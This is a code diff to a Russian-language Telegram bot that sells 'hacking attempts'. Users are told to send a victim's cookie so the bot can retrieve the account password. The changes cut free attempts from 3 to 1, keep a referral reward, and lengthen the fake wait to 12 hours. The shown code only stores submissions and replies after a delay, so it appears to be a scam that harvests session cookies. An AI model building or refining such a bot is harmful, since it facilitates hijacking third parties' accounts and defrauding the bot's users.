@@ -33,10 +33,10 @@ def get_user_attempts(user_id):
         if os.path.exists(ATTEMPTS_FILE):
             with open(ATTEMPTS_FILE, "r", encoding="utf-8") as f:
                 attempts = json.load(f)
-            return attempts.get(str(user_id), 3)
-        return 3
+            return attempts.get(str(user_id), 1)  # Изменено с 3 на 1
+        return 1  # Изменено с 3 на 1
     except:
-        return 3
+        return 1  # Изменено с 3 на 1
 
 def set_user_attempts(user_id, attempts_count):
     """Устанавливает количество попыток пользователя"""
@@ -509,9 +509,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         referrer_id=referrer_id
     )
     
-    # Если пользователь новый, даем ему 3 попытки
+    # Если пользователь новый, даем ему 1 попытку (изменено с 3 на 1)
     if is_new_user:
-        set_user_attempts(user_id, 3)
+        set_user_attempts(user_id, 1)
     
     attempts = get_user_attempts(user_id)
     referrals = get_referral_count(user_id)
@@ -546,7 +546,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
         f"Привет, {user_name}! 👋\n\n"
-        f"🎯 **У тебя {attempts} бесплатных попыток взлома**\n"
+        f"🎯 **У тебя {attempts} бесплатная попытка взлома**\n"
         f"👥 Приглашено друзей: {referrals}\n"
         f"🔑 За каждого друга +1 попытка\n\n"
         f"Выбери нужную категорию:",
@@ -626,7 +626,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await query.edit_message_text(
-            f"🎯 **У тебя {attempts} попыток взлома осталось**\n\n"
+            f"🎯 **У тебя {attempts} попытка взлома осталась**\n\n"
             f"Выбери своё устройство:",
             reply_markup=reply_markup
         )
@@ -668,7 +668,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.message.reply_text(
             "Скинь cookie в бота\n"
             "И бот начнет поиск пароля вашей жертвы😈\n"
-            "В течении дня бот скинет вам пароль от аккаунта"
+            "В течении 12 часов бот скинет вам пароль от аккаунта"
         )
         return
     
@@ -725,7 +725,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
             f"Привет, {user_name}! 👋\n\n"
-            f"🎯 **У тебя {attempts} попыток взлома**\n"
+            f"🎯 **У тебя {attempts} попытка взлома**\n"
             f"👥 Приглашено друзей: {referrals}\n"
             f"🔑 За каждого друга +1 попытка\n\n"
             f"Выбери нужную категорию:",
@@ -1165,7 +1165,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Отлично, наш бот уже начал поиски пароля вашей жертвы.\n"
             f"🎯 Осталось попыток: {remaining}\n\n"
             "Не создавайте повторных заявок, иначе будете заблокированы\n"
-            "Если в течении 6 часов бот не ответил, значит он не нашел пароль от аккаунта"
+            "Если в течении 12 часов бот не ответил, значит он не нашел пароль от аккаунта"
         )
         asyncio.create_task(send_delayed_message(update.effective_chat.id, context))
     else:
@@ -1195,11 +1195,11 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("У вас нет активной рассылки.")
 
 # ===================================================
-# ФУНКЦИЯ ЗАДЕРЖКИ (6 часов 3 минуты)
+# ФУНКЦИЯ ЗАДЕРЖКИ (12 часов)
 # ===================================================
 
 async def send_delayed_message(chat_id, context):
-    delay_seconds = 6 * 3600 + 3 * 60
+    delay_seconds = 12 * 3600  # 12 часов
     try:
         await asyncio.sleep(delay_seconds)
         await context.bot.send_message(
@@ -1223,8 +1223,9 @@ def main():
     
     print("🤖 Бот запущен! Нажмите Ctrl+C для остановки.")
     print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
-    print("🎯 У каждого пользователя 3 бесплатные попытки")
+    print("🎯 У каждого пользователя 1 бесплатная попытка")
     print("👥 За каждого приглашенного друга +1 попытка")
+    print("⏰ Задержка перед ответом: 12 часов")
     print("📨 Для рассылки нажми кнопку 'Рассылка' в меню")
     print("🗑 Для удаления пользователей нажми кнопку 'Удалить пользователей' в меню")
     app.run_polling()
